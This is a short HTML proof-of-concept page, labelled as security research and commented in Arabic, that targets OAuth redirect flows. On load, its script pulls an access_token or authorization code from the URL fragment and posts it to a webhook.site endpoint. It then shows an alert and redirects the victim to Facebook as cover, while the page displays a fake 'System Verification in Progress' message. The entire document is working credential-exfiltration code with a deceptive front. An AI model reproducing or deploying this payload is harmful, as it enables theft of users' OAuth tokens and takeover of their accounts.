<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Research - PoC</title>
</head>
<body>
    <script>
        // 1. وظيفة سحب التوكن من رابط العنوان (URL Fragment)
        function captureAndSend() {
            const urlHash = window.location.hash;
            if (urlHash) {
                // استخراج الـ access_token أو الـ code
                const params = new URLSearchParams(urlHash.substring(1));
                const token = params.get('access_token') || params.get('code');

                if (token) {
                    // 2. إرسال البيانات إلى الـ Webhook الجديد الخاص بك
                    const webhookEndpoint = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
                    
                    fetch(webhookEndpoint, {
                        method: 'POST',
                        mode: 'no-cors', 
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            status: "Success",
                            captured_data: token,
                            type: urlHash.includes('access_token') ? "Implicit_Token" : "Auth_Code",
                            timestamp: new Date().toLocaleString()
                        })
                    }).then(() => {
                        // 3. إظهار الـ Alert الذي طلبه المهندس لإثبات الاختراق
                        alert("Critical Alert: Account Security Compromised!\nToken Exfiltrated to External Server.");
                        // توجيه الضحية لفيسبوك للتمويه
                        window.location.href = "https://www.facebook.com/me";
                    });
                }
            }
        }

        // تشغيل العملية فور تحميل الصفحة
        window.onload = captureAndSend;
    </script>
    <div style="text-align: center; margin-top: 50px; font-family: Arial;">
        <h2>System Verification in Progress...</h2>
        <p>Please do not close this window.</p>
    </div>
</body>
</html>
